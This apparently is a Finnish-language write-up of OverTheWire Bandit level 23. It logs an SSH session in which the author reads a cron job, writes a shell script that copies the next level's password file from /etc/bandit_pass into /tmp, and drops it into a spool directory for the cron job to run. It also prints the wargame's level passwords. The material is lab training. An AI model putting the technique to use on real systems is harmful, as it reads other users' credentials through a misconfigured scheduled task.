# level 23

0Zf11ioIjMVN551jX3CmStKLYqjk54Ga

OHJEITA JA VINKKEJÄ:  A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

&& tarvittavia kommentoja: chmod, cron, crontab, crontab(5) (use “man 5 crontab” to access this)

```
PS C:\Users\zhao-> ssh bandit23@bandit.labs.overthewire.org -p 2220
                         _                     _ _ _
                        | |__   __ _ _ __   __| (_) |_
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_
                        |_.__/ \__,_|_| |_|\__,_|_|\__|


                      This is an OverTheWire game server.
            More information on http://www.overthewire.org/wargames

backend: gibson-1
bandit23@bandit.labs.overthewire.org's password:

      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---" ire.org


Welcome to OverTheWire!

If you find any problems, please report them to the #wargames channel on
discord or IRC.

--[ Playing the games ]--

  This machine might hold several wargames.
  If you are playing "somegame", then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command "mktemp -d" in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc
  restricted so that users cannot snoop on eachother. Files and directories
  with easily guessable or short names will be periodically deleted! The /tmp
  directory is regularly wiped.
  Please play nice:

    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS!
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few useful tools which you can find
 in the following locations:

    * gef (https://github.com/hugsy/gef) in /opt/gef/
    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us on discord or IRC.

  Enjoy your stay!

bandit23@bandit:~$ whoami
bandit23
bandit23@bandit:~$ ls
bandit23@bandit:~$ cat /etc/bandit_pass/bandit23
0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
```

## testaukset ja tarkistukset, vastaukset

Ohjeen mukaan voi olla samankaltainen kuin aikaisempi taso, eli tarkistellaan polku `/etc/cron.d` ja siellä on varmasti alla skripti, että josta joudutaan syöttää algoritminsa ja runnaa shell skriptinsä. 


- huomoina nyt ollaan taso 23:ssa, että aikaisempi mentiin tämä `cronjob_bandit23` nyt 24.

```
bandit23@bandit:~$ ls
bandit23@bandit:~$ cd /etc/cron.d
bandit23@bandit:/etc/cron.d$ ls
behemoth4_cleanup  cronjob_bandit22  cronjob_bandit24  leviathan5_cleanup    otw-tmp-dir
clean_tmp          cronjob_bandit23  e2scrub_all       manpage3_resetpw_job  sysstat

bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null

bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash
myname=$(whoami)
cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```
---

## virallinen vastaus

virallinen vastaus steppi, tässä onkin pientä hämäystä - koska polussa `/etc/cron.d$ ls ` alla on 23, mutta nyt tässä taso **level 23** pitää selvittää **24:sen salasana.**


Nyt mentin takaisin siihen polkuun ja luettaan se skripti (`cronjob_bandit24.sh`)

```
bandit23@bandit:~$ cd /etc/cron.d
bandit23@bandit:/etc/cron.d$ ls
behemoth4_cleanup  cronjob_bandit22  cronjob_bandit24  leviathan5_cleanup    otw-tmp-dir
clean_tmp          cronjob_bandit23  e2scrub_all       manpage3_resetpw_job  sysstat
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

shopt -s nullglob

myname=$(whoami)

cd /var/spool/"$myname"/foo || exit
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi
donebandit23@bandit:/etc/cron.d$
```

aikaisemmasta ja osa ohjeistuksesta tuli säätöä, mutta nyt löydetiin oikea ratkaisu:
- ensin luodaan `/tmp` polkuun alle kansio ja seuraavat tiedostot ja skriptin alle liittä tämä polku tiedoston nimi
- toi `Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory` - osuudesta voi ignoraa ja tärkeänä on liitetty skripti määritys komento

```
bandit23@bandit:/etc/cron.d$ cd /tmp
bandit23@bandit:/tmp$ ls
ls: cannot open directory '.': Permission denied
bandit23@bandit:/tmp$ mkdir /tmp/randomit
bandit23@bandit:/tmp$ cd randomit
bandit23@bandit:/tmp/randomit$ ls
bandit23@bandit:/tmp/randomit$ touch script.sh


bandit23@bandit:/tmp/randomit$ nano script.sh
Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit23@bandit:/tmp/randomit$ ls
script.sh
bandit23@bandit:/tmp/randomit$ cat script.sh
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/randomit/password
```

seuraavaksi luo password tiedosto - ja määritä `randomit` eli tämän kansio polkuun oikeus chmod komennolla ja tarkista oikeudet
- sitten viimeisenä kopioidaan sen ohjeen `/var/spool/$myname/foo` - polku ja etsitään se salasansa

```
bandit23@bandit:/tmp/randomit$ touch password
bandit23@bandit:/tmp/randomit$ chmod 777 -R /tmp/randomit
bandit23@bandit:/tmp/randomit$ ls -l
total 4
-rwxrwxrwx 1 bandit23 bandit23  0 May 23 07:01 password
-rwxrwxrwx 1 bandit23 bandit23 67 May 23 06:59 script.sh

bandit23@bandit:/tmp/randomit$ cp script.sh /var/spool/bandit24/foo/bandit24_pass.sh
bandit23@bandit:/tmp/randomit$ ls -l
total 8
-rwxrwxrwx 1 bandit23 bandit23 33 May 23 07:05 password
-rwxrwxrwx 1 bandit23 bandit23 67 May 23 06:59 script.sh
bandit23@bandit:/tmp/randomit$ cat password
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```


tässä oli jotakin muuta tarkistusta, että miksi polun `/foo` täältä ei löydy mitään ja oikeutta ei ole:

```
bandit23@bandit:/tmp/randomit$ cd /var/spool
bandit23@bandit:/var/spool$ ls
bandit24  cron  mail  rsyslog
bandit23@bandit:/var/spool$ cd bandit24/
bandit23@bandit:/var/spool/bandit24$ ls
foo
bandit23@bandit:/var/spool/bandit24$ cd foo
bandit23@bandit:/var/spool/bandit24/foo$ ls
ls: cannot open directory '.': Permission denied
bandit23@bandit:/var/spool/bandit24/foo$ ls -l
ls: cannot open directory '.': Permission denied
```


## linkkejä ja vastauksia:

> näiden linkien vastauksista saattaa olla vanhoja steppiä, mutta nyt päivitetty ja suoritettu tämä taso ja vastauksensa niin tiedetän miten menee - ja ehkä myöhemmin tämä taso muuttuu vähittelen. Kuitenkin vastauksien bloggi ja sisältö on vähä eri, että kantsii tehdä vertailu.

- https://mayadevbe.me/posts/overthewire/bandit/level24/
- https://david-varghese.medium.com/overthewire-bandit-level-23-level-24-3a7efa0e3b99
- https://thegrayarea.tech/overthewire-wargames-bandit-l23-33ff6eba4af
